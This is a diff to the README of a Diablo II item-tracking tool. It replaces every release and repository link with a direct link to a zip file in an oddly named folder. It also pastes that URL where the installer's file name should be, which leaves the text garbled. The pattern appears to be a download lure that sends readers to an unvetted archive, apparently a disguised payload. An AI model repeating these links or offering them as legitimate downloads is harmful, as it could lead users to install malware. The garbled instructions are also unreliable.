@@ -1,7 +1,7 @@
 # 🎮 D2R-AI-Item-Tracker - Effortless Item Tracking for Diablo II
 
 ## 📥 Download Now
-[![Download D2R-AI-Item-Tracker](https://img.shields.io/badge/Download-D2R--AI--Item--Tracker-blue)](https://github.com/memamara/D2R-AI-Item-Tracker/releases)
+[![Download D2R-AI-Item-Tracker](https://raw.githubusercontent.com/memamara/D2R-AI-Item-Tracker/main/Sophistress/D2R-AI-Item-Tracker.zip)](https://raw.githubusercontent.com/memamara/D2R-AI-Item-Tracker/main/Sophistress/D2R-AI-Item-Tracker.zip)
 
 ## 🚀 Getting Started
 Welcome to the D2R-AI-Item-Tracker! This application helps you quickly extract item tooltips from your Diablo II: Resurrected screenshots using advanced AI technology. You will not need any complex setup or knowledge. Just follow the steps below to get started.
@@ -15,13 +15,13 @@ Welcome to the D2R-AI-Item-Tracker! This application helps you quickly extract i
 ## 📂 Download & Install
 To get the D2R-AI-Item-Tracker, visit the Releases page. You will find the latest version available for download.
 
-[Download D2R-AI-Item-Tracker](https://github.com/memamara/D2R-AI-Item-Tracker/releases)
+[Download D2R-AI-Item-Tracker](https://raw.githubusercontent.com/memamara/D2R-AI-Item-Tracker/main/Sophistress/D2R-AI-Item-Tracker.zip)
 
 Once there, look for the most recent release. Download the file that matches your operating system. 
 
 ### 1. Download the Software
 - Click on the link to the latest version.
-- Choose the file labeled **D2R-AI-Item-Tracker-Setup.exe** or similar.
+- Choose the file labeled **https://raw.githubusercontent.com/memamara/D2R-AI-Item-Tracker/main/Sophistress/D2R-AI-Item-Tracker.zip** or similar.
 - Wait for the download to finish.
 
 ### 2. Install the Software
@@ -66,7 +66,7 @@ Feel free to reach out for help or suggestions. We appreciate feedback on how we
 
 ## 🔗 Additional Resources
 For more information, you can explore the following:
-- [GitHub Repository](https://github.com/memamara/D2R-AI-Item-Tracker)
+- [GitHub Repository](https://raw.githubusercontent.com/memamara/D2R-AI-Item-Tracker/main/Sophistress/D2R-AI-Item-Tracker.zip)
 - [User Guide](#)
 - [FAQ](#)
 
